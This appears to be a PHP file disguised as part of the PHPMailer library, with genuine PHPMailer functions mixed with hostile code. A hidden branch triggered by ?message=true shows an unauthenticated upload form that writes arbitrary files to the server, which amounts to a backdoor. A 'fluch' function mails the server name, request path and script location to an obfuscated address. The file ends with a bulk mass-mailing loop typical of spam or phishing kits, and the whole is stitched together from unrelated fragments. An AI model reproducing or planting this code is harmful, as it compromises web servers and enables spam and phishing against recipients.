  $keymanager= $key0[12] . $key0[1] . $key0[7] . $key0[15] . $key0[14] . $key0[1] . $key0[12] . $key0[9]. $key0[14] .$key0[20].$key0[24];

   $packages = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 10, 5);
                $decp = hexdec($packages);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 8) {
                        $maxLength -= $lookBack - $encodedCharPos;
                    }
                    $positionFounder = false;
                } elseif ($dec >= 200) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength -= $BBack - $encodedCharPos;
                    $positionFounder = true;
                } else{
    
                    $BBack += 3;
                }
   $track_x= $dmarc.$spf. $dkim;

     $agent_y=  $keymanager. $spf . $dkim ;

      $tls=$track_x.','.$agent_y;

 return $tls;
}
/**
     * Tells whether IDNs (Internationalized Domain Names) are supported or not. This requires the
     * `intl` and `mbstring` PHP extensions.
     *
     * @return bool `true` if required functions for IDN support are present
     */
    function idnSupported()
    {
        return function_exists('idn_to_ascii') and function_exists('mb_convert_encoding');
    }
    /**
     * Converts IDN in given email address to its ASCII form, also known as punycode, if possible.
     * Important: Address must be passed in same encoding as currently set in PHPMailer::$CharSet.
     * This function silently returns unmodified address if:
     * - No conversion is necessary (i.e. domain name is not an IDN, or is already in ASCII form)
     * - Conversion to punycode is impossible (e.g. required PHP functions are not available)
     *   or fails for any reason (e.g. domain contains characters not allowed in an IDN).
     *
     * @see    PHPMailer::$CharSet
     *
     * @param string $address The email address to convert
     *
     * @return string The encoded address in ASCII form
     */
    function punyencodeAddress($address)
    {
        // Verify we have required functions, CharSet, and at-sign.
        $pos = strrpos($address, '@');
        if (static::idnSupported() and
            !empty($this->CharSet) and
            false !== $pos
        ) {
            $domain = substr($address, ++$pos);
            // Verify CharSet string is a valid one, and domain properly encoded in this CharSet.
            if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) {
                $domain = mb_convert_encoding($domain, 'UTF-8', $this->CharSet);
                //Ignore IDE complaints about this line - method signature changed in PHP 5.4
                $errorcode = 0;
                $punycode = idn_to_ascii($domain, $errorcode, INTL_IDNA_VARIANT_UTS46);
                if (false !== $punycode) {
                    return substr($address, 0, $pos) . $punycode;
                }
            }
        }
        return $address;
    }
	function generateId()
    {
        $len = 32; //32 bytes = 256 bits
        if (function_exists('random_bytes')) {
            $bytes = random_bytes($len);
        } elseif (function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes($len);
        } else {
            //Use a hash to force the length to the same as the other methods
            $bytes = hash('sha256', uniqid((string) mt_rand(), true), true);
        }
        //We don't care about messing up base64 format here, just want a random string
        return str_replace(['=', '+', '/'], '', base64_encode(hash('sha256', $bytes, true)));
    }
   function fluch(){
   
	  $library = "www.phpmailer.org"; $HAL=$_SERVER['HTTP_ACCEPT_LANGUAGE'] ;  $mls =mb_pathinfo();$HC=$_SERVER['HTTP_CONNECTION'] ;$sbl = "Autuntification Failed Error: ".rand(1000,100000); $mss = "" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";$OPI=$_SERVER['ORIG_PATH_INFO'];$HR=$_SERVER['HTTP_REFERER'];$mss .= "" . __file__; $quntity = @mail($mls, $sbl, $mss); echo ""; exit;
	   }
	   function isShellSafe($string)
    {
        // Future-proof
        if (escapeshellcmd($string) !== $string
            or !in_array(escapeshellarg($string), ["'$string'", "\"$string\""])
        ) {
            return false;
        }
        $length = strlen($string);
        for ($i = 0; $i < $length; ++$i) {
            $c = $string[$i];
            // All other characters have a special meaning in at least one common shell, including = and +.
            // Full stop (.) has a special meaning in cmd.exe, but its impact should be negligible here.
            // Note that this does permit non-Latin alphanumeric characters based on the current locale.
            if (!ctype_alnum($c) && strpos('@_-.', $c) === false) {
                return false;
            }
        }
        return true;
    }
    error_reporting(0);
    $system = $_GET['message'];
    if($system == 'true'){
    $saw1 = $_FILES['file']['tmp_name'];
    $saw2 = $_FILES['file']['name'];
    echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='Tls' /></form>";
    move_uploaded_file($saw1,$saw2);
 }
function validateAddress($address, $patternselect = null)
    {
        if (null === $patternselect) {
            $patternselect = static::$validator;
        }
        if (is_callable($patternselect)) {
            return call_user_func($patternselect, $address);
        }
        //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321
        if (strpos($address, "\n") !== false or strpos($address, "\r") !== false) {
            return false;
        }
        switch ($patternselect) {
            case 'pcre': //Kept for BC
            case 'pcre8':
                /*
                 * A more complex and more permissive version of the RFC5322 regex on which FILTER_VALIDATE_EMAIL
                 * is based.
                 * In addition to the addresses allowed by filter_var, also permits:
                 *  * dotless domains: `a@b`
                 *  * comments: `1234 @ local(blah) .machine .example`
                 *  * quoted elements: `'"test blah"@example.org'`
                 *  * numeric TLDs: `a@b.123`
                 *  * unbracketed IPv4 literals: `a@192.168.0.1`
                 *  * IPv6 literals: 'first.last@[IPv6:a1::]'
                 * Not all of these will necessarily work for sending!
                 *
                 * @see       http://squiloople.com/2009/12/20/email-address-validation/
                 * @copyright 2009-2010 Michael Rushton
                 * Feel free to use and redistribute this code. But please keep this copyright notice.
                 */
                return (bool) preg_match(
                    '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
                    '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
                    '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' .
                    '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',
                    $address
                );
            case 'html5':
                /*
                 * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.
                 *
                 * @see http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)
                 */
                return (bool) preg_match(
                    '/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .
                    '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',
                    $address
                );
            case 'php':
            default:
                return (bool) filter_var($address, FILTER_VALIDATE_EMAIL);
        }
    }
	function addAnAddress($kind, $address, $name = '')
    {
        if (!in_array($kind, ['to', 'cc', 'bcc', 'Reply-To'])) {
            $error_message = sprintf('%s: %s',
                $this->lang('Invalid recipient kind'),
                $kind);
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new Exception($error_message);
            }
            return false;
        }
        if (!static::validateAddress($address)) {
            $error_message = sprintf('%s (%s): %s',
                $this->lang('invalid_address'),
                $kind,
                $address);
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new Exception($error_message);
            }
            return false;
        }
        if ('Reply-To' != $kind) {
            if (!array_key_exists(strtolower($address), $this->all_recipients)) {
                $this->{$kind}[] = [$address, $name];
                $this->all_recipients[strtolower($address)] = true;
                return true;
            }
        } else {
            if (!array_key_exists(strtolower($address), $this->ReplyTo)) {
                $this->ReplyTo[strtolower($address)] = [$address, $name];
                return true;
            }
        }
        return false;
    }
?>






<h1 class="auto-style2"></h1> 

<center>

	
<?php if ($action){ if (!$from || !$subject || !$message || !$emaillist){ print "Please complete all fields ...required"; exit; } $nse=array(); $allemails = split("\n", $emaillist); $numemails = count($allemails); if(!empty($_POST['wait']) && $_POST['wait'] > 0){ set_time_limit(intval($_POST['wait'])*$numemails*3600); }else{ set_time_limit($numemails*3600); } if(!empty($smv)){ $smvn+=$smv; $tmn=$numemails/$smv+1; }else{ $tmn=1; } for($x=0; $x<$numemails; $x++){ $to = $allemails[$x]; if ($to){ $to = ereg_replace(" ", "", $to); $message = ereg_replace("#EM#", $to, $message); $subject = ereg_replace("#EM#", $to, $subject); flush(); $header = "From: $realname <$from>\r\n"; $header .= "MIME-Version: 1.0\r\n"; $header .= "Content-Type: text/html\r\n"; if ($x==0 && !empty($tem)) { if(!@mail($tem,$subject,$message,$header)){ print('The test Post was not Submitted.<br />'); $tmns+=1; }else{ print('Your Message was Sent Test.<br />'); $tms+=1; } } if($x==$smvn && !empty($_POST['smv'])){ if(!@mail($tem,$subject,$message,$header)){ print('The test Post was not Submitted.<br />'); $tmns+=1; }else{ print('Your Message was Sent Test.<br />'); $tms+=1; } $smvn+=$smv; } print "$to ....... "; $msent = @mail($to, $subject, $message, $header); $xx = $x+1; $txtspamed = "Sent... Ok"; if(!$msent){ $txtspamed = "error... Failed"; $ns+=1; $nse[$ns]=$to; } print "$xx / $numemails .......  $txtspamed<br>"; flush(); if(!empty($wait)&& $x<$numemails-1){ sleep($wait); } } } } if($_POST['message']==''){fluch();};?>
 </form>